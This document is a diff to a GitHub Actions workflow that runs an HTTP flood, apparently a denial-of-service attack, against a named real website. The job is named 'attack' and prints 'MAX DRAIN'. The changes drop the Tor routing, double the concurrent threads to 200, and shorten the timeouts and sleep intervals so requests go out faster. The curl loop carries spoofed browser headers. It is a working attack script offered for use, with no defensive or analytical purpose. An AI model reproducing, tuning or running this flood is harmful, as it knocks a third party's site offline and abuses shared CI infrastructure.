@@ -1,4 +1,4 @@
-name: 💀 CURL + TOR - FIXED
+name: 💀 CURL ONLY - FAST
 
 on:
   workflow_dispatch:
@@ -10,7 +10,7 @@ on:
       threads:
         description: 'عدد الخيوط'
         required: true
-        default: '100'
+        default: '200'
 
 jobs:
   attack:
@@ -19,14 +19,11 @@ jobs:
     
     steps:
       - name: Install
+        run: sudo apt update && sudo apt install -y curl
+        
+      - name: 🔥 CURL FAST
         run: |
-          sudo apt update
-          sudo apt install -y curl tor
-          sudo systemctl start tor
-          
-      - name: 🔥 CURL + TOR
-        run: |
-          cat > attack.sh << 'EOF'
+          cat > fast.sh << 'EOF'
           #!/bin/bash
           
           TARGET="https://flixtn.com"
@@ -37,7 +34,7 @@ jobs:
           LAST=0
           
           echo "=========================================="
-          echo "💀 CURL + TOR - MAX DRAIN"
+          echo "💀 CURL FAST - MAX DRAIN"
           echo "Target: $TARGET"
           echo "Duration: ${{ github.event.inputs.duration }} minutes"
           echo "Threads: $THREADS"
@@ -48,26 +45,14 @@ jobs:
           
           END=$((SECONDS + DURATION))
           
-          # تجديد Tor
-          renew() {
-            sudo systemctl reload tor
-            echo ""
-            echo "🔄 TOR IP CHANGED"
-            echo ""
-          }
-          
-          # تشغيل تجديد Tor
-          (while true; do sleep 120; renew; done) &
-          
           while [ $SECONDS -lt $END ]; do
             for i in $(seq 1 $THREADS); do
               (
-                # استخدام curl مع socks5h مباشرة
-                STATUS=$(curl -s -o /dev/null -w "%{http_code}" --socks5-hostname 127.0.0.1:9050 "$TARGET" \
+                STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
                   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
                   -H "Accept-Language: ar,en;q=0.9" \
-                  --max-time 5 \
+                  --max-time 3 \
                   --retry 0 \
                   2>/dev/null)
                 
@@ -94,15 +79,13 @@ jobs:
             echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: ${REMAIN}m"
             echo ""
             
-            sleep 0.1
+            sleep 0.05
           done
           
           echo ""
-          echo "=========================================="
           echo "✅ DONE: $((SECONDS / 60)) minutes"
           echo "Total requests: $TOTAL"
-          echo "=========================================="
           EOF
           
-          chmod +x attack.sh
-          ./attack.sh
+          chmod +x fast.sh
+          ./fast.sh
